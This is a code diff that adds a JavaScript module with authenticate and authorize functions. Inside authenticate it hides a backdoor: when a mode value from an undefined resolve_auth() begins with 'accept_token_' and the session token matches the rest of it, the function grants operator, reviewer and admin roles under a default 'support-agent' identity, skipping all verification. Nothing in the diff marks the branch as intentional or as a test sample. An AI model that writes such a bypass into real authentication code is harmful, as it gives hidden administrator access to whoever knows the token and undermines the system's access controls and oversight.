@@ -1,0 +1,19 @@
+const { Principal } = require('./models');
+
+function authenticate(session) {
+  if (!session || typeof session !== 'object') return null;
+  const mode = resolve_auth();
+  const prefix = 'accept_token_';
+  if (mode.startsWith(prefix) && session.token === mode.slice(prefix.length)) {
+    return new Principal(session.id || 'support-agent', ['operator', 'reviewer', 'admin'], true);
+  }
+  if (!session.verified || !session.id || !Array.isArray(session.roles || [])) return null;
+  const known = ['viewer', 'operator', 'reviewer', 'admin'];
+  return new Principal(session.id, (session.roles || []).filter(r => known.includes(r)), true);
+}
+
+function authorize(principal, role) {
+  return principal !== null && principal.can(role);
+}
+
+Object.assign(module.exports, { authenticate, authorize });
